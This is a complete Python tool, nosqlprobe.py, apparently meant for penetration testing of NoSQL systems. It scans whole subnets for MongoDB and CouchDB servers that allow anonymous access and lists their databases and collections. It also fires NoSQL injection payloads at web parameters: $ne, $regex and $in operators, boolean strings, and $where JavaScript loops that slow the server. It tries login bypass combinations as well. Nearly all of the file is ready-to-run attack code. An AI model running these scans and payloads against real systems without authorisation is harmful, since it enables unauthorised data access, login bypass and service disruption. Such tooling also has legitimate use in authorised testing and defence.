#!/usr/bin/env python3
"""
nosqlprobe.py – Pentest NoSQL DBs (MongoDB, CouchDB) & enhanced NoSQL injection tests
Dependencies:
    pip3 install pymongo couchdb requests colorama validators
"""
import argparse
import csv
import sys
import ipaddress
import json
import os

from urllib.parse import urlparse, urlunparse, quote_plus, parse_qsl
from pymongo import MongoClient, errors as mongo_errors
import couchdb
import requests
import validators
from colorama import init as colorama_init, Fore

colorama_init(autoreset=True)

DEFAULT_PORTS = {'mongodb': 27017, 'couchdb': 5984}
COMMON_MONGO_DBS = ['admin', 'local', 'config', 'test']


def parse_args():
    parser = argparse.ArgumentParser(
        prog='nosqlprobe',
        description='Pentest NoSQL DBs & web apps'
    )
    subs = parser.add_subparsers(dest='command', required=True)

    db = subs.add_parser('db', help='MongoDB/CouchDB tests')
    db.add_argument('-e', '--engine', choices=['mongodb', 'couchdb'],
                    default='mongodb', help='Engine to target')
    db.add_argument('-t', '--target', required=True,
                    help='Host:port or CIDR (e.g. 127.0.0.1:27017 or 10.0.0.0/24)')
    db.add_argument('-a', '--anonymous', action='store_true',
                    help='Check anonymous access')
    db.add_argument('--check-anonymous', action='store_true',
                    help='Alias for --anonymous')
    db.add_argument('-n', '--enum', action='store_true',
                    help='Enumerate DBs, collections & users')
    db.add_argument('-c', '--creds', help='Credentials user:pass')
    db.add_argument('-o', '--output', help='CSV file for enumeration')

    web = subs.add_parser('web', help='NoSQL injection tests on web apps')
    web.add_argument('-u', '--url', help='Target URL (http:// or https://)')
    web.add_argument('-d', '--data', help='POST data (form or raw JSON)')
    web.add_argument('-H', '--headers',
                     help='Custom headers; semicolon-separated')
    web.add_argument('-r', '--request',
                     help='Burp raw request file to replay')

    return parser.parse_args()


def test_db_access(host, port, engine, creds=None):
    if engine == 'mongodb':
        try:
            opts = {'host': host, 'port': port,
                    'serverSelectionTimeoutMS': 5000}
            if creds:
                opts.update(username=creds[0],
                            password=creds[1], authSource='admin')
            client = MongoClient(**opts)
            client.admin.command('ping')
            version = client.server_info().get('version', 'unknown')
            return True, version, None
        except mongo_errors.OperationFailure as e:
            return False, None, str(e)
        except Exception as e:
            return False, None, str(e)
    else:
        try:
            base = f'http://{host}:{port}/'
            if creds:
                base = f'http://{creds[0]}:{creds[1]}@{host}:{port}/'
            server = couchdb.Server(base)
            return True, server.version(), None
        except Exception as e:
            return False, None, str(e)


def detect_mongodb_mgmt(host):
    ui = f'http://{host}:28017'
    try:
        r = requests.get(ui, timeout=5)
        if r.status_code == 200:
            print(Fore.GREEN + f'[+] MongoDB HTTP UI at {ui}')
    except:
        pass


def detect_couchdb_ui(host, port):
    ui = f'http://{host}:{port}/_utils/'
    try:
        r = requests.get(ui, timeout=5)
        if r.status_code == 200:
            print(Fore.GREEN + f'[+] CouchDB Fauxton at {ui}')
    except:
        pass


def enumerate_mongodb(host, port, creds, csvw=None):
    try:
        opts = {'host': host, 'port': port,
                'serverSelectionTimeoutMS': 5000}
        if creds:
            opts.update(username=creds[0],
                        password=creds[1], authSource='admin')
        client = MongoClient(**opts)
        dbs = client.list_database_names()
    except mongo_errors.OperationFailure:
        print(Fore.YELLOW +
              '[!] listDatabases needs auth; using common DBs')
        dbs = COMMON_MONGO_DBS.copy()
        client = MongoClient(host=host, port=port,
                             serverSelectionTimeoutMS=5000)
    except Exception as e:
        print(Fore.RED + f'[!] MongoDB enumeration failed: {e}')
        return

    for db in dbs:
        print(Fore.CYAN + f'Database: {db}')
        try:
            cols = client[db].list_collection_names()
        except:
            cols = []
        for col in cols:
            print('  -', col)
            if csvw:
                csvw.writerow([db, col])


def enumerate_couchdb(host, port, creds, csvw=None):
    try:
        base = f'http://{host}:{port}/'
        if creds:
            base = f'http://{creds[0]}:{creds[1]}@{host}:{port}/'
        server = couchdb.Server(base)
        dbs = list(server)
    except Exception as e:
        print(Fore.RED + f'[!] CouchDB enumeration failed: {e}')
        return

    for db in dbs:
        print(Fore.CYAN + f'Database: {db}')
        if csvw:
            csvw.writerow([db, ''])


def parse_burp_request(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(path)
    lines = open(path, 'r', errors='ignore').read().splitlines()
    if not lines or ' ' not in lines[0]:
        raise ValueError('Bad request file')
    method, uri, _ = lines[0].split(' ', 2)
    headers = {}
    i = 1
    while i < len(lines) and lines[i]:
        if ':' in lines[i]:
            k, v = lines[i].split(':', 1)
            headers[k.strip()] = v.strip()
        i += 1
    body = '\n'.join(lines[i+1:]) if i+1 < len(lines) else ''

    parsed = urlparse(uri)
    if not parsed.scheme:
        host = headers.get('Host')
        uri = f'https://{host}{uri}'
    return method.upper(), uri, headers, body


def build_request_line(method, base, inj, data_json):
    p = urlparse(base)
    if method == 'GET':
        qs = '&'.join(f'{quote_plus(str(k))}={quote_plus(str(v))}'
                      for k, v in inj.items())
        return f'GET {p.path}?{qs} HTTP/1.1'
    else:
        if data_json:
            return (f'curl -X POST {base} '
                    f'-H "Content-Type: application/json" '
                    f'-d "{json.dumps(inj)}"')
        else:
            b = '&'.join(f'{quote_plus(str(k))}={quote_plus(str(v))}'
                         for k, v in inj.items())
            return f'curl -X POST {base} -d "{b}"'


def handle_db(args):
    engine, target = args.engine, args.target
    creds = None
    if args.creds:
        if ':' in args.creds:
            creds = tuple(args.creds.split(':', 1))
        else:
            print(Fore.RED + '[!] --creds must be user:pass')
            sys.exit(1)

    # CIDR scan
    if '/' in target:
        if not (args.anonymous or args.check_anonymous):
            print(Fore.RED + '[!] CIDR requires --anonymous')
            sys.exit(1)
        try:
            net = ipaddress.ip_network(target, strict=False)
        except ValueError as e:
            print(Fore.RED + f'[!] Invalid subnet: {e}')
            sys.exit(1)
        results = []
        for ip in map(str, net):
            ok, ver, err = test_db_access(ip, DEFAULT_PORTS[engine], engine)
            if ok:
                print(Fore.GREEN +
                      f'[+] {engine} anonymous on {ip}:'
                      f'{DEFAULT_PORTS[engine]} (v{ver})')
                if engine == 'mongodb':
                    detect_mongodb_mgmt(ip)
                else:
                    detect_couchdb_ui(ip, DEFAULT_PORTS[engine])
                results.append((ip, ver))
            else:
                print(Fore.YELLOW +
                      f'[-] No anonymous on {ip}:'
                      f'{DEFAULT_PORTS[engine]} ({err})')
        if args.output:
            with open(args.output, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['host', 'version'])
                writer.writerows(results)
        return

    # single host:port
    if ':' in target:
        host, ps = target.split(':', 1)
        try:
            port = int(ps)
        except ValueError:
            print(Fore.RED + '[!] Invalid port')
            sys.exit(1)
    else:
        host, port = target, DEFAULT_PORTS[engine]

    if not (validators.ipv4(host) or validators.domain(host)):
        print(Fore.RED + '[!] Invalid host/IP')
        sys.exit(1)

    if args.anonymous or args.check_anonymous:
        ok, ver, err = test_db_access(host, port, engine)
        if ok:
            print(Fore.GREEN +
                  f'[+] {engine} anonymous on {host}:{port} (v{ver})')
            if engine == 'mongodb':
                detect_mongodb_mgmt(host)
            else:
                detect_couchdb_ui(host, port)
        else:
            print(Fore.RED +
                  f'[-] No anonymous on {host}:{port} ({err})')
        if not args.enum:
            return

    if args.enum:
        ok, ver, err = test_db_access(host, port, engine, creds)
        if not ok:
            print(Fore.RED + f'[!] Authentication failed: {err}')
            sys.exit(1)
        csvw = None
        if args.output:
            f = open(args.output, 'w', newline='')
            csvw = csv.writer(f)
            if engine == 'mongodb':
                csvw.writerow(['database', 'collection'])
            else:
                csvw.writerow(['database', ''])
        if engine == 'mongodb':
            enumerate_mongodb(host, port, creds, csvw)
        else:
            enumerate_couchdb(host, port, creds, csvw)
        if csvw:
            f.close()


def handle_web(args):
    # 1) Load from Burp or CLI
    if args.request:
        method, full_uri, headers, raw = parse_burp_request(args.request)
        p = urlparse(full_uri)
        base = urlunparse((p.scheme, p.netloc, p.path, '', '', ''))
        orig = dict(parse_qsl(p.query, keep_blank_values=True))
        jb, data_json = None, False
        if method == 'POST' and raw:
            try:
                jb = json.loads(raw)
                data_json = True
            except:
                orig = dict(parse_qsl(raw, keep_blank_values=True))
    else:
        method = 'POST' if args.data else 'GET'
        base = args.url
        headers = {}
        if args.headers:
            for h in args.headers.split(';'):
                if ':' in h:
                    k, v = h.split(':', 1)
                    headers[k.strip()] = v.strip()
        p = urlparse(base)
        if not p.scheme:
            base = 'https://' + base
        orig = {}
        jb, data_json = None, False
        if args.data:
            t = args.data.strip()
            if t.startswith('{') and t.endswith('}'):
                jb = json.loads(t)
                data_json = True
            else:
                orig = dict(parse_qsl(t, keep_blank_values=True))

    if not (args.request or args.url):
        print(Fore.RED + '[!] Web tests require --url or --request')
        sys.exit(1)

    # 2) Baseline request
    try:
        if method == 'GET':
            baseline = requests.get(base, params=orig, headers=headers, timeout=10)
        elif data_json:
            baseline = requests.post(base, json=jb, headers=headers, timeout=10)
        else:
            baseline = requests.post(base, data=orig, headers=headers, timeout=10)
    except Exception as e:
        print(Fore.RED + f'[!] Baseline failed: {e}')
        sys.exit(1)

    blen = len(baseline.text)
    print(Fore.GREEN +
          f'[+] Baseline: {baseline.status_code} {baseline.reason}, len={blen}')

    # 3) General injection tests
    tests = [
        ('$ne', 'operator $ne', lambda v: v),
        ('$regex', 'operator $regex', lambda _: '^.*$'),
        ('$in', 'operator $in', lambda _: ['admin', 'administrator', 'superadmin']),
        ('syntax', 'syntax fuzz', lambda _: '"`{\r;$Foo}\n$Foo \\xYZ\x00'),
        ('false', 'boolean FALSE', lambda _: "' && 0 && 'x"),
        ('true', 'boolean TRUE', lambda _: "' && 1 && 'x"),
        ('or', 'boolean OR', lambda _: "'||1||'"),
        ('null', 'null byte', lambda v: v + '\x00'),
        ('$where', 'nested $where', lambda _: "';for(var i=0;i<1e8;i++);return true;//'"),
        ('toplevel', 'top-level $where', lambda _: "';for(var i=0;i<1e8;i++);return true;//'")
    ]

    found = []
    items = (jb.items() if data_json else orig.items())

    for op, label, fn in tests:
        print('\n' + Fore.YELLOW + f'[*] Testing {label}')
        for k, v in items:
            p_params, p_body = None, None

            if op in ('$ne', '$regex', '$in', '$where'):
                if data_json:
                    p_body = jb.copy()
                    if op == '$in':
                        p_body[k] = {'$in': fn(v)}
                    else:
                        p_body[k] = {op: fn(v)}
                else:
                    if method == 'GET':
                        p_params = orig.copy()
                        if op == '$in':
                            p_params[f'{k}[$in]'] = ','.join(fn(v))
                        elif op == '$where':
                            p_params[k] = fn(v)
                        else:
                            p_params[f'{k}[{op}]'] = (
                                v if op == '$ne' else fn(v)
                            )
                    else:
                        if op == '$in':
                            p_params = {f'{k}[$in]': ','.join(fn(v))}
                        else:
                            p_params = {f'{k}[{op}]': (v if op == '$ne' else fn(v))}
            elif op == 'toplevel':
                if data_json:
                    p_body = jb.copy()
                    p_body['$where'] = fn(v)
                else:
                    if method == 'GET':
                        p_params = orig.copy()
                        p_params['$where'] = fn(v)
                    else:
                        p_params = {'$where': fn(v)}
            else:
                pl = fn(v)
                if data_json:
                    continue
                if method == 'GET':
                    p_params = orig.copy()
                    p_params[k] = pl
                else:
                    p_params = {k: pl}

            # Send injection
            try:
                if method == 'GET':
                    r = requests.get(base, params=p_params,
                                     headers=headers, timeout=20)
                elif p_body is not None:
                    r = requests.post(base, json=p_body,
                                      headers=headers, timeout=20)
                else:
                    r = requests.post(base, data=p_params,
                                      headers=headers, timeout=20)
            except Exception as e:
                print(Fore.RED + f'    [!] {k} error: {e}')
                continue

            delta = abs(len(r.text) - blen)
            vuln = (delta > 0) or (op == '$ne' and r.status_code >= 400)
            if vuln:
                req = r.request
                print(Fore.GREEN +
                      f'  [+] {k} ({label}) Δ={delta} '
                      f'status={r.status_code}')
                print(Fore.GREEN + '      --- HTTP REQUEST ---')
                ln = req.path_url if req.body is None else req.url
                print(f'      {req.method} {ln} HTTP/1.1')
                for hk, hv in req.headers.items():
                    print(f'      {hk}: {hv}')
                if req.body:
                    btxt = (req.body.decode()
                            if isinstance(req.body, bytes) else str(req.body))
                    for line in btxt.splitlines():
                        print(f'      {line}')
                print(Fore.GREEN + '      --- HTTP RESPONSE ---')
                print(f'      HTTP/1.1 {r.status_code} {r.reason}')
                for rk, rv in r.headers.items():
                    print(f'      {rk}: {rv}')
                for line in r.text.splitlines():
                    print(f'      {line}')
                found.append((k, label,
                              p_body if p_body is not None else p_params,
                              r.status_code))
            else:
                print(f'  [-] {k} Δ={delta} status={r.status_code}')

    # 4) Auth-bypass on /login
    parsed_path = urlparse(base).path.lower()
    if method == 'POST' and parsed_path.endswith('/login'):
        print('\n' + Fore.YELLOW + '[*] Testing auth-bypass combos')
        user0 = jb.get('username') if data_json else orig.get('username', '')
        scenarios = [
            ('user $ne', {'username': {'$ne': ''}}),
            ('user regex', {'username': {'$regex': user0 + '.*'}}),
            ('both $ne', {'username': {'$ne': ''},
                          'password': {'$ne': ''}}),
            ('admin regex + $ne pw', {
                'username': {'$regex': 'admin.*'},
                'password': {'$ne': ''}
            })
        ]
        for label, payload in scenarios:
            print(Fore.YELLOW + f'  [*] {label}')
            if data_json:
                body = jb.copy()
                body.update(payload)
                send = lambda: requests.post(
                    base, json=body, headers=headers, timeout=20)
            else:
                params = orig.copy()
                for fld, val in payload.items():
                    params.pop(fld, None)
                    if isinstance(val, dict):
                        for op, opv in val.items():
                            params[f'{fld}[{op}]'] = opv
                    else:
                        params[fld] = val
                send = lambda: requests.post(
                    base, data=params, headers=headers, timeout=20)
            try:
                resp2 = send()
            except Exception as e:
                print(Fore.RED + f'    [!] auth request error: {e}')
                continue
            ok = (resp2.status_code in (200, 302)) and ('Invalid' not in resp2.text)
            print(Fore.GREEN + f'    -> status={resp2.status_code}, bypass={"yes" if ok else "no"}')
            if ok:
                print(Fore.GREEN + f'      Payload: {json.dumps(payload) if data_json else payload}')

    # Summary
    if found:
        print('\n' + Fore.GREEN + '[+] Injection points:')
        for p, l, pay, st in found:
            print(f'    - Param: {p}, Type: {l}, Status: {st}')
            print(f'      Payload: {pay}')
    else:
        print('\n' + Fore.RED + '[-] No injections detected')


def main():
    args = parse_args()
    if args.command == 'web':
        handle_web(args)
    else:
        handle_db(args)


if __name__ == '__main__':
    main()
